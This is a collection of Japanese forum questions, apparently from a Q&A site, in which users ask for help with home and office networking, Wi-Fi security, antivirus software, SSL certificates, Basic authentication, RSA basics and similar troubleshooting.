おはようございます。 無線LANのセキュリティについて勉強したのですが、自分の考えが正しいかどうかわからないので質問させてください。 セキュリティの設定がない無線LANにPCをつなぎました。そこでは外部に漏れてもいいような情報のやり取りしかしていません。 心配なのは自分のPC内のデータが漏洩しないかなのですが、 １、PCのウイルスソフトなどのセキュリティは一応推奨レベルで設定してあります ２、無線LANは自分のものではなく職場のものです セキュリティのない無線LANでのリスクは乗っ取りと盗聴だと勉強したのですが、乗っ取りについては自分の無線LANではないし、PCをつないだ時間は短時間で周りにだれもいない(周囲数百メートルだれもいません)環境なので問題ないと考えます。盗聴については通信した内容がどうでもよい内容なので、仮に盗聴されても大丈夫です。 このような状況で、PC内のデータが漏洩するようなことはありますか？有線LANでも起こりうるデータ漏洩のリスクは除外して、セキュリティのない無線LANにつないだことに由来するデータ漏洩のリスクを教えてください。
サーバー管理会社からSSLサーバー証明書がもうすぐ切れますとお知らせがきました ４万くらい必要なんですが、どうなんでしょう？ 意味があるんでしょうか？
httpでアクセスしても、強制的にhttpsにリダイレクトされる設定になっているサーバーにPHPプログラムを置いてあります。 FireFox3.6.15でサクセスしたところ、 「要求したページは暗号化されていますが、暗号化されていない項目を含んでいます。あなたがこのページで表示や入力する情報は第三者が簡単に傍受できます。」といわれました。 傍受されて困るような情報は何もないのでかまわないのですが、このメッセージがでることでサイト閲覧者が不安になるのは困ります。 会費するには暗号化されていない項目を含まないようにすればよいでしょうか？？
ちょっと不思議な現象なのですが。 社内のパソコンの台数は２６台です。 Windows7が２台（１台は殆んど電源を入れません。）、 VISTAが１台、 XPが２３台(その内、半数は殆んど電源を入れていません。） LANDISKが３台（IO-DATAのHDL-250Uが２台、HDL-C1.0が１台で、 HDL-250Uの１台は殆んど電源を入れません。 HDL-250Uのもう１台は付けっぱなしです。） 以上が繋がっています。 IPアドレスは、すべて自動取得になっています。 LANDISKの電源はできるだけ壁から取るようにしています。 HUBも買い替えました。 ところが、夜、殆んどのマシンの電源を切った後に、暫くするとLANが繋がらなくなります。 InterNetも繋がらなく、お互いのPCにLAN接続が出来ません。 そういう時に限って、HDL-C1.0の電源が入りません。 コンセントの場所を付替えると、電源が入り、 LAN環境も復活し始めます。 こういう現象が今年の春から、月に１・２回発生します。 どなたかお解かりの方はいらっしゃいますでしょうか？
よろしくお願いします。XPでネットしていますがパソコンの性能が良くないせいかノートンやマカフィーを試してみましたが動作が遅くなってとてもネット出来る状態じゃなかったのでフリーソフトのAvastを入れたらだいぶ軽くなって何とかストレス無しにネットできるようになりました。後スパイウェア対策にWindow Defenderをダウンロードして入れてネットしていますがこの組み合わせでセキュリティ対策は大丈夫でしょうか？何か問題があったら教えてほしいです。
URLは間違えてないのに、「インターネット　エクスプローラーではこのページは表示できません」 となってしまいます。回線はダイアルですが、他のサイトも見れるしメールの問題もありません。 なぜ開かないかが、解りません。OSはWindows7 です。
２台のパソコンでネットワーク接続したいのですがどうにもできません ・一台目 XP　SP3　IPアドレス192.168.0.2　サブ255.255.255.0　デフォ192.168.0.1 ・二台目 XP　SP３　IPアドレス192.168.10.14　サブ255.255.255.0　デフォ192.168.10.1 接続方法：ADSLモデム-HUB-１台目 　　　　　　　　　　　　　　　　　｜ 　　　　　　　　　　　　　　　　２台目　　 IPアドレスが違うためにネットワークできないのかな、と思い二台目のIPアドレスなどを IP192.168.0.3　サブ255.255.255.0　デフォ192.168.0.1　へ変更すると 二台目のパソコンがネットに接続することができません。 ADSLモデムを初期化や電源抜いて三〇分ほど放置したりしてみましたが変更することができません。 どうしたらネットワーク構築できますでしょうか？ 説明不足な部分がありましたら補足しますのでどうぞよろしくお願いいたします。
RSA暗号について勉強中のものですが、これまでのところ （１）送信側はは公開鍵(e,n)で平文aを b = a^e mod n で暗号文bを作成する。 （２）受信側は秘密鍵dを知っており、上記暗号文bからb^d mod n で元の平文aが求まる。 （３）暗号としてのキモは、(e,n)からでは復号できない。dを求めることも困難（nの素因数分解が困難） というのが私の理解したところです。数式等もある程度理解しました。 ただ、ここで素朴な疑問があります。dをしらなくてもbのべき乗を繰り返していけば復号できるのでは？ということです。自分が送信側で平文aを暗号化してbを作る。bから　bxb→b'　b'xb→b''　b''xb→b''' 　と計算していけば平文aにたどり着くのでは？　（その結果dもわかったことになる） 平文が現れたかのチェック時間は余分にかかると思いますが、dを知っていてbのd乗を計算するのと上記のように２乗、３乗...と繰り返すのと大きな違いがあるのでしょうか？ 長文ですいません。
現在、業務システムが動いている環境で、不特定多数の人に情報を提供したいと考えています。 実際には、Webサーバを立ち上げて無線LANでそこにアクセスして貰おうと考えているのですが、 どうすれば以下の事が出来るかで悩んでいます。 １．Webサーバから業務システムへはアクセスさせたい。(データが業務システムにある為) ２．無線LANからは業務システムへは入らせたくない。 これを、高価な機器(レイヤ３HUB等)を使わず民生品だけで簡単に構築する方法は無いでしょうか。 また、無線LANルータで無線LAN側のポートを制限(80番しか使えない等)する事は出来るのでしょうか。 よろしくお願いいたします。
社内ネットワークについて質問です。 現在、私のパソコン（会社のもの）がネットワークにつながらなくて困っています。 現状は次の通りです。 (1)ＬＡＮケーブルにつなげないで、パソコンを運用するのことは問題ないが、ＬＡＮケーブルをつなげた途端、フリーズする。 (2)時々、”ＩＰアドレスが重複しています”みたいなエラーが発生する事がある。 (3)社内ネットワークから外されることは、時々ある。 (4)ＩＰアドレスは自動取得になっている。 (5)社内には、４０台近くのパソコンがあり、ネットワーク（ＬＡＮ，無線）でつながっている。 (6)時々、お客様がパソコン持参で、インターネットにつなげる事がある。 (7)ネットワーク自体、パソコン（会社，個人共）が増える度に、各自がネットワーク設定しており、管理者はいない。 (8)ネットワークグループは８グループあり、整備されていない。 仕事にも影響があるので、早く解決したいのですが、原因，解決方法が分かりません。 助けて下さい。 お願いします。
無線LANをもらったので、接続を試していますがうまくつながらなくて困っています。 ネット環境はADSLです。 親機は、BAFFALOの「WHR-G54S」、子機はCOREGAのCG-WLUSB300NBKです。 Windows7用のドライバをそれぞれネットからダウンロードして認識はできているものと思われます。 親機の設定でアクセスポイントを見つけるところまでできたのですが、そこからWANに出れません。どういった設定が足りないのでしょうか・・・
最近会社で、ウィルスバスターのコーポレートエディション10.0を入れたのですが、入れたPCで外付けのDVDが使えないようです。 実際は、XPでもwindows7でもドライブ名は表示されますが、中のファイルの表示がされない状態です。 インストールしたいのはMS-Office2010stdです。（Autorun.infがあるとウィルスとして誤検出してしまうような話を見かけましたが・・・・・・。）因みにまっさらなCDを入れてみても状況は一緒のようです。 ウィルスバスターのパスワードを管理者から貰ってアンロードする必要が有りますか。それともウィルシバスター以外の別の原因でしょうか。 済みませんが、ご回答宜しくお願い致します。
windows server2008 R2 にて MS SQL Server を使い、 インターネット越しに、ODBC接続を試みております。 うまくいきません。 こちらでやったことと現状を書きます。 ・サーバー（ホスティングサービスなのでリモートにて確認）上で、ODBC設定を行い接続出来ることを確認。 ・Windowsファイアーウォールなどポート開放済み。 ・一度試しにファイアーウォールを停止させてみたが、外部からの接続は出来ませんでした。 ・外部からのポート確認サイト（http://www.cman.jp/network/support/port.html）を使って 　1433 が空いているか確認するが、NG。（ファイアーウォール停止時も確認しましたがNG) と、ファイヤーウォール停止させてもNGというのが府に落ちません。 サーバー上でODBCは問題ないので、サービスは動いているはず。 何か他に原因があるのでしょうか。 お手数ですが、ご教授いただけますでしょうか。
あるWebページにBasic認証をかけてあるのですが、 アクセスしようとするとなぜかID/PWを必ず2回聞かれてしまうのです。 URLはこんな感じだとします。 http://example.com/myhp/secret/index.html 同じIDとPWを入力すればきちんとindex.htmlが表示されますけど、 気持ち悪いので直したいのですがどうしても原因を判別できません、 お心当たりの設定項目はありますでしょうか？ なお、クライアント側はIE8、FireFox3.6ではNGで、Choromeだけは 2回きかれませんでした。 設定内容をおさらいすると、 /usr/local/apache2/htdocs/myhp/secret/ に.htaccessが置いてあり、以下のように記述されています。 （このPath以外には.htaccessは置いてありません） AuthName "Welcome to My HP" AuthType Basic AuthUserFile /tmp/myweb/basicAuth AuthGroupFile /dev/null <LIMIT GET> require valid-user </LIMIT> DirectoryIndex index.html /tmp/myweb/basicAuth には、「myname:AaBbCcDd」みたいに書いてあります。
スクリーンセーバーや動画をダウンロードしようとすると、セキュリティースキャンが実行され、いつまでも終わらない症状は何故なんでしょうか？
こないだ、うちの父の携帯に楽天カードと名乗る者から、 メールアドレスが解らないから教えてほしいという内容の電話がかかってきたのです。 そんなことってあるのでしょうか？怪しいなと思うのですが。 父の携帯の調子が悪くて切れてしまい、それから再度かけ直してくることはありませんでした。 こういう経験がある方いらっしゃいますか？ メアドなんて教えない方がいいですよね？ ちなみに楽天カードは所有しております。
畏れ入ります。 FTPSの勉強をしていたのですが、クライアントソフトでFTPSで接続した場合 ちゃんと暗号化されているかキャプチャした結果を見たかったのですが、やり方がわかりませんでした。 もう少し具体的に申しますと、 こちらの方の記事 http://blogs.gine.jp/taka/archives/1378 の一番下を見ると 「キャプチャーで確認すると、AUTHコマンド後に暗号化されていることがわかります。 」 とあるのですが、 まさにこのようなキャプチャをとってみたいのです。 OSはWINDOWSXPです。 よろしくお願いします。
LAN接続についてご教示ください。 PC3台（Win7、WinVista、WinXP）をHub（スイッチング）、LANケーブル3本（ストレート）を使用して接続したのですが、認識してくれませんでした。 どうしたら3台のPCがファイル等の共有ができるようになるのでしょうか？ インターネットなどに接続する必要はなく、ファイル共有ができればと思っております。 よろしくお願いします。
D26HWを使用しているのですが、富士通AH550/5Bで無線を飛ばせると知り、 情報を探して見ましたが見つかりません。 ノートパソコンが無線内臓なので、ノートパソコン自体で無線を飛ばしたいです。 PS3やPSPを無線で繋ぎたくて質問しました。 皆さんの知恵を是非ともお貸しください。 よろしくお願いします。
ＰＣのログイン時パスワードを入力していたのですが、パスワードを入力しなくてもログインしたいのですが設定方法が解りません。 設定方法を教えていただきたいのですが、宜しくお願い致します。
インターネットを使用中にサイトを開こうとしたら、フリーズしてしまい、 「問題が発生したため、iexplore.exeを終了します。―――――」 との表示がでてしまい、一旦ページをアウトしました。 その後、再起動などを試して何回インターネットを開いても、ホームページさえも表示されずに、上記のメッセージがでてしまいました。 色々調べた結果、不要なプログラムの削除を行ったり、プロパティからインターネットの再設定など試しましたが効果がありません。 インターネット自体が開けないのでツールバーなども操作しようがなくて困っています。 どうか詳しい方、アドバイスお願い致します。 ちなみにwindows XPです
『OCNさんから30GB/1日のアップロードを越えましたよ』、通知が来てあせっています。 うちは店なんですが、お客さんにWi-Fiを開放していて、おそらくその中でP2Pによる 大量のトラフィックがあったのでは？と思っています。 そこで無線で接続しているデバイスがtorrentなどのソフトを使えないように したいのですが、どうするのがいいのかネットで調べてみたのですが なかなか良い対策法（出来ればお金をかけずに）がありません。 一つ思ったのがルーターのUPnPを無効にし、スカイプなど必要なソフト用の ポートだけ開放するというやり方はどうでしょうか？もちろんtorrent等の ポートは閉じます。 これだけやってれば素人には手出しできない設定といえますか？ Wi-Fi用には無線ルーターを使っていますが、現在は親ルーターでDHCPを 使っているので子ルーター（無線用）はブリッジ機能だけ使用しています。 何か良い方法があればご教示願います。
PSPやWiiをインターネットの接続先を設定した時、検索して自分のパソコンのメールアドレスがあったので、それを接続先にした後に「『WEPキー』を入力してください」という表示がありました。 その時は「WEPキー」という言葉は初耳で説明書を見たら、暗号化にしたものと書いてありました。 「WEPキー」には何を入力したらいいんですか？ PSPやWiiの本体の説明書に書かれているんですか？
いつも参考にさせていただいております。 早速ですが、ある支店のサーバーに2枚のNICがささっております。 OSはWindowsServer2008R2です。 NIC1：１９２．１６８．１．１００ NIC2：１９２．１６８．１．２００ サブネットマスクは両NICとも２５５．２５５．２５５．０です。 NIC2はVPN用にルータのみに繋がっております。 コマンドプロンプトより　ipconfig /all　で確認しますと IPルーティングが「いいえ」となり二枚のNIC間でルーティングはしないことに なっています。 実際にVPNでNIC2からサーバーに接続し、エクスプローラより \\192.168.1.50　などとしてNIC1側のPCを見ようとすると、見えません。 しかし支店にいわせるとVPNで接続してNIC1側のコンピュータが見えている ということです。 2枚のNICのIPアドレスのホスト部が同じなので、この場合はひょっとすると 見えるのかな、とも思いますが、この点、可能なのかどうかご教示いただけ ますと助かります。 ネットワークに関してそれほど詳しくないのですが、2008R2で特にルーティングの 設定もしておりませんし、サーバーのみがVPNで見えているつもりだったので ちょっと戸惑っております。また、私がVPNで接続したときは見えなくて、 支店の者が支店外から接続して見えているというのもよくわかりません。 現在、ちょっと事情があって実際に作業をして確認ができないのですが、 アドバイスなどいただけますと非常に助かります。
パソコンを起動して初期の画面を表示するまでは、特に３０秒くらい、問題はないです。 ただ、その起動後にハードディスクの動作ランプが点灯し、ハードディスクをシークしているような動作音がして約２０分間全く動作を受け付けません。 その後は、ストレスの感じない動作となります。 この２０分があまりに長いのでハードとセキュリティソフトのメーカーに両方に問い合わせても、両方とも、相手に責任を押し付けているよう回答しか得られず、解決に至っていません。 素人考えですが、セキュリティソフトが毎回起動後にディスクチェエクをしているようなイメージです。 実は、友人も全く同じような不満を訴えていおり、他にもいるのではないでしょうか。 教えて欲しいのは、この動作を止める、もしくは通常操作の裏でやるような設定はできないのでしょうか。 ＰＣは富士通、ＦＭＶＣＥ４０Ｗ７、ウイルスソフトはウイルスバスター２０１１です。 言葉足らずと思いますが、アドバイスをよろしくお願いします。
ネットワークについて勉強しているのですが回線の部分がごちゃごちゃしてわかりません。 まずアナログとデジタルにわけると、 ・アナログ 一般電話回線、ADSL、CATV、光ファイバー →それぞれ専用のモデムを介してデジタルに変換。 ・デジタル ISDN→伝送路からすでにデジタル。 で合っていますか？ それから題名にあるように、一般電話回線とADSLの違いがわかりません。 ADSLの場合は電話回線を介してスプリッタという装置を用いて 音声とデータをわけ、モデムへ運ぶところまではわかったのですが、 そもそも、電話回線と一般電話回線は違うものなのでしょうか？ 一般電話回線は音声とデータをわけずに直接つないでいるということでしょうが？ 何か見当違いな質問をしてる気がしてきましたがご存知の方おしえてください。 お願いします。
メールを１通送信したら、１０通送信中とでました、と同時にセキュリティZEROの　ふるまい検知　反応がありました。　思わず慌てて”無視”をクリックしてしまい、送信を中止する事ができませんでした。（ちなみに　100MB程度の写真を８枚添付しました）　その後、メールの送信済アイテムを確認した所、最初に送信した１通だけが、残っていました。 　何かに感染したのでしょうか？　また、送信されたデータを確認する方法等はありますでしょうか？　どちらかというと、初心者にちかい方なので、ものすごく不安で、対応に苦慮しております。
はじめまして。 今回初めて質問させて頂きます。 ＰＯＳシステムでiPadを操作端末として利用していますが、 一つお聞きしたいことがあります。 店内のローカルネットワークとインターネットに同時接続したいのですが、 一方を接続すれば、もう一方が切断されてしまいます。 あまりシステムに強くない為、初歩的な質問かと思いますが よろしくお願いします。
インターネットのメリットとデメリットを教えてください！
ネットワークの知識が乏しく、どうするのがよいのかわからないので教えてください。 自社にネットワークカメラを設置して外部からアクセスをしようとしています。 使用しているルーターがビジネスホンと兼用であり、なおかつ古い機種のようで DDNSに対応していませんでした。 現在) ONU　→　ビジネスホン兼用ルーター　→　HUB　→　ネットワークカメラ そこで考えたのが、ビジネスホンルータの下位にDDNS対応のルーターを設置して、 インターネットに接続をすればよいのではと考えました。 予想） ONU　→　ビジネスホンルーター　→　DDNS対応ルーター　→　HUB等 実際にはどのように設定をしていいかがわかりません。 私のイメージとしては、今までプロバイダーの設定がビジネスホンのルータに してあったのを削除して、DDNS対応のルーターに設定すればよいと考えました。 しかし、それではインターネットに接続ができませんでした。 私の考えは間違っているのでしょうか？ もしくは単純にDDNSの設定だけして、ビジネスホンルータに何らかの設定を すればよいのでしょうか？ 最終的には外部からカメラに接続をしたいのですが、「予想)」の接続で DDNSに繋がればよいと思っています。 (そこまで行けば自分でなんとかできると思います) 質問が下手で大変申し訳ありません。 足りない情報があれば仰っていただければと思います。 どなたかよいアドバイスをご教授いただければと思います。 ●内容 ・ビジネスホンルータの型番　GX-4BRU ・DDNS対応ルーター　WHR-G301N
